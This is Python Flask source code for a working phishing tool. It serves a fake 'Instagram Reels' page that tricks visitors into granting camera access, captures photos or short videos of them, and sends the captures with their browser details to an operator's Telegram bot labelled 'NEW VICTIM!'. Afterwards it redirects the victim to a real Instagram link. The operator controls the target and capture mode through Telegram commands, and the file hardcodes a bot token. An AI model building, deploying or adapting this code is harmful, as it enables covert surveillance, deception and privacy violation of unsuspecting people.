import os
from flask import Flask, render_template_string, request, jsonify
import requests
import base64
import json
from datetime import datetime
import threading

app = Flask(__name__)

# Telegram Config
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "8580091181:AAEXNF_lK3I2k_YRUVysnf1Cz8IXxrXGdTs")
CHAT_ID = os.getenv("CHAT_ID", "8507973714")
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

# Global Settings
target_url = "https://www.instagram.com/reels/"
mode = "photo"  # photo/video
camera = "user"  # user/environment

def send_telegram(msg):
    requests.post(f"{TELEGRAM_API}/sendMessage", data={"chat_id": CHAT_ID, "text": msg})

def send_photo(data, caption):
    requests.post(f"{TELEGRAM_API}/sendPhoto", files={"photo": ("photo.jpg", data, "image/jpeg")}, data={"chat_id": CHAT_ID, "caption": caption})

def send_video(data, caption):
    requests.post(f"{TELEGRAM_API}/sendVideo", files={"video": ("video.mp4", data, "video/mp4")}, data={"chat_id": CHAT_ID, "caption": caption})

@app.route('/webhook', methods=['POST'])
def webhook():
    global target_url, mode, camera
    try:
        update = request.json
        if 'message' in update and 'text' in update['message']:
            text = update['message']['text']
            
            if text.startswith('http') and 'instagram.com' in text:
                target_url = text
                send_telegram(f"✅ Target Instagram: {target_url}")
            elif text == '/photo':
                mode = 'photo'
                send_telegram("📸 Photo mode ON")
            elif text == '/video':
                mode = 'video'
                send_telegram("🎥 Video mode ON")
            elif text == '/front':
                camera = 'user'
                send_telegram("🤳 Front camera")
            elif text == '/back':
                camera = 'environment'
                send_telegram("📷 Back camera")
            elif text == '/help':
                send_telegram("🔧 Commands:\n/video - video mode\n/photo - photo mode\n/front - front cam\n/back - back cam\nInstagram reel link - set target")
    except:
        pass
    return jsonify({"ok": True})

@app.route('/')
def phishing():
    global target_url, mode, camera
    html = f'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        *{{margin:0;padding:0;box-sizing:border-box}}
        body{{background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);height:100vh;display:flex;align-items:center;justify-content:center;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}}
        .container{{background:rgba(255,255,255,0.95);border-radius:25px;padding:40px;max-width:380px;width:90%;text-align:center;box-shadow:0 25px 50px rgba(0,0,0,0.2)}}
        .logo{{font-size:4em;margin-bottom:20px}}
        h1{{color:#262626;font-size:2em;font-weight:600;margin-bottom:15px}}
        .sub{{color:#666;margin-bottom:30px;font-size:1.1em}}
        .btn-group{{display:flex;gap:10px;margin:25px 0;flex-wrap:wrap;justify-content:center}}
        .btn{{padding:15px 25px;border:none;border-radius:25px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s;box-shadow:0 8px 25px rgba(0,0,0,0.15);min-width:120px}}
        .camera-btn{{background:#0095f6;color:white}}
        .camera-btn.active{{background:#0062cc}}
        .video-btn{{background:#ff6b6b;color:white}}
        .capture-btn{{background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);color:white;padding:20px 40px;font-size:18px;width:100%;margin-top:25px}}
        #video{{width:100%;max-height:300px;border-radius:15px;margin:20px 0;display:none;background:#000}}
        #status{{color:#666;margin-top:15px;font-size:14px}}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📱</div>
        <h1>Instagram Reels</h1>
        <p class="sub">Click allow to watch video</p>
        
        <div class="btn-group">
            <button class="btn camera-btn active" onclick="setCamera('user')">🤳 Selfie</button>
            <button class="btn camera-btn" onclick="setCamera('environment')">📷 Back</button>
            <button class="btn {"video-btn" if mode=="video" else "btn"}' onclick="toggleVideo()">{"🎥 Video" if mode=="video" else "📸 Photo"}</button>
        </div>
        
        <video id="video" autoplay playsinline muted></video>
        <button class="capture-btn" onclick="capture()">🎥 Watch Video</button>
        <div id="status"></div>
    </div>

    <script>
        let stream, mediaRecorder, chunks = [], isVideo = {{"true" if mode=="video" else "false"}};
        let currentCamera = 'user';
        const video = document.getElementById('video');
        const status = document.getElementById('status');

        async function initCamera() {{
            try {{
                stream = await navigator.mediaDevices.getUserMedia({{
                    video: {{ facingMode: currentCamera }},
                    audio: isVideo ? true : false
                }});
                video.srcObject = stream;
                video.style.display = 'block';
                video.play();
            }} catch(e) {{
                status.innerHTML = '⚠️ Camera permission needed';
            }}
        }}

        function setCamera(type) {{
            currentCamera = type;
            document.querySelectorAll('.camera-btn').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            if(stream) stream.getTracks().forEach(t=>t.stop());
            initCamera();
        }}

        function toggleVideo() {{
            isVideo = !isVideo;
            initCamera();
        }}

        async function capture() {{
            status.innerHTML = '🔄 Sending...';
            
            if(isVideo) {{
                // VIDEO RECORDING - FIXED BLACK SCREEN
                mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm;codecs=vp9' }});
                chunks = [];
                
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = sendMedia;
                
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 4000); // 4 sec video
            }} else {{
                // PHOTO - FIXED BLACK SCREEN
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(blob => {{
                    const reader = new FileReader();
                    reader.onload = () => sendMedia(reader.result);
                    reader.readAsDataURL(blob);
                }}, 'image/jpeg', 0.9);
            }}
        }}

        function sendMedia(dataUrl) {{
            fetch('/upload', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    data: dataUrl,
                    type: isVideo ? 'video' : 'photo',
                    camera: currentCamera,
                    ua: navigator.userAgent.slice(0,100)
                }})
            }}).then(r => r.json()).then(() => {{
                status.innerHTML = '✅ Enjoy your video!';
                setTimeout(() => window.location.href = '{target_url}', 1000);
            }});
        }}

        initCamera();
    </script>
</body>
</html>'''
    return render_template_string(html, target_url=target_url, mode=mode, camera=camera)

@app.route('/upload', methods=['POST'])
def upload():
    global target_url
    data = request.json
    media_data = data['data'].split(',')[1]
    bytes_data = base64.b64decode(media_data)
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    caption = f"🎯 NEW VICTIM!\n🕒 {timestamp}\n📱 {data['camera']} camera\n📸 {data['type'].upper()}\n🌐 {data['ua']}"
    
    if data['type'] == 'video':
        send_video(bytes_data, caption)
    else:
        send_photo(bytes_data, caption)
    
    return jsonify({"status": "success", "redirect": target_url})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    send_telegram("🚀 ULTIMATE CAMERA BOT LIVE!\n📱 Send Instagram reel link to set target!")
    app.run(host='0.0.0.0', port=port, debug=False)
